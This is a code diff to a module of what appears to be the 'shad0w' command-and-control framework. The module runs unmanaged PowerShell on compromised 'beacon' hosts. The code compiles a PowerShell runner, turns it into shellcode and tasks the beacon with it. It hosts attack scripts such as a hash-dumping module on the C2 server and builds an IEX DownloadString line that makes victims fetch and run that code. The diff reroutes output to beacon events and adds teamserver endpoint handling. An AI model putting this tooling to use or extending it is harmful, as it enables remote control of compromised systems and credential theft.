@@ -14,6 +14,9 @@ from lib import shellcode
 __description__ = "Run unmanaged powershell on a session"
 __author__ = "@_batsec_"
 
+# beacon to exec command on
+current_beacon = None
+
 # identify the task as shellcode execute
 USERCD_EXEC_ID = 0x3000
 
@@ -46,7 +49,7 @@ def psh_callback(shad0w, data):
     global FIRST_OUTPUT
 
     if FIRST_OUTPUT:
-        print("")
+        shad0w.event.beacon_info(current_beacon, "")
         FIRST_OUTPUT = False
 
     data = data.replace("[+]", "\033[1;32m[+]\033[0m")
@@ -54,7 +57,7 @@ def psh_callback(shad0w, data):
     data = data.replace("[i]", "\033[1;34m[i]\033[0m")
     data = data.replace("[*]", "\033[1;34m[*]\033[0m")
 
-    sys.stdout.write(data)
+    shad0w.event.beacon_info(current_beacon, data)
 
     return ""
 
@@ -96,14 +99,13 @@ def compile_binary():
     os.system("mcs /reference:System.Management.Automation.dll -out:psh.exe main.cs")
     os.chdir(cwd)
 
-def main(shad0w, args):
+def main(shad0w, args, beacon):
+    global current_beacon
+
+    # make beacon global
+    current_beacon = beacon
 
     raw_args = args
-
-    # check we actually have a beacon
-    if shad0w.current_beacon is None:
-        shad0w.debug.log("ERROR: No active beacon", log=True)
-        return
 
     # usage examples
     usage_examples = """
@@ -155,16 +157,16 @@ psh --info GetHash
         basedir = "/root/shad0w/scripts/"
         args.info = args.info + ".ps1"
         if args.info not in os.listdir(basedir):
-            shad0w.debug.error(f"No module with name '{args.info}'")
+            shad0w.event.beacon_info(current_beacon, f"No module with name '{args.info}'")
             return
         os.system(f"less {basedir + args.info}")
         return
 
     if args.list:
         modules = os.listdir("/root/shad0w/scripts")
-        shad0w.debug.log(f"{len(modules)} available modules\n", log=True)
+        shad0w.event.beacon_info(current_beacon, f"{len(modules)} available modules\n")
         for module in modules:
-            print("-\t", module.replace(".ps1", ""))
+            shad0w.event.beacon_info(current_beacon, "-\t " + module.replace(".ps1", "") + "\n")
         return
 
     if args.module:
@@ -180,12 +182,19 @@ psh --info GetHash
                 mod_data = file.read()
 
             serve_path = "/" + random_string()
-            shad0w.debug.log(f"Hosting module '{module}' ({len(mod_data)} bytes) => {serve_path}", log=True)
-            shad0w.beacons[shad0w.current_beacon]["serve"][serve_path] = mod_data
+            shad0w.event.beacon_info(current_beacon, f"Hosting module '{module}' ({len(mod_data)} bytes) => {serve_path}")
+            shad0w.beacons[current_beacon]["serve"][serve_path] = mod_data
 
-            iex = f"IEX(New-Object System.Net.WebClient).DownloadString(\"https://{shad0w.endpoint}{serve_path}\"); "
+            if shad0w.teamserver:
+                endpoint = shad0w.teamsrv.c2_endpoint
+            else:
+                endpoint = shad0w.endpoint
+
+            iex = f"IEX(New-Object System.Net.WebClient).DownloadString(\"https://{endpoint}{serve_path}\"); "
 
             psh_args += iex
+
+            print(psh_args)
 
     if args.command:
         cmd = ' '.join(raw_args[raw_args.index("-c") + 1:])
@@ -204,5 +213,8 @@ psh --info GetHash
 
     b64_comp_data = shellcode.generate(PSH_BIN, donut_args, None)
 
-    shad0w.beacons[shad0w.current_beacon]["task"] = (USERCD_EXEC_ID, b64_comp_data)
-    shad0w.beacons[shad0w.current_beacon]["callback"] = psh_callback
+    # dont clear the callbacks, cause the responses are chunked
+    shad0w.clear_callbacks = False
+
+    shad0w.beacons[current_beacon]["task"] = (USERCD_EXEC_ID, b64_comp_data)
+    shad0w.beacons[current_beacon]["callback"] = psh_callback
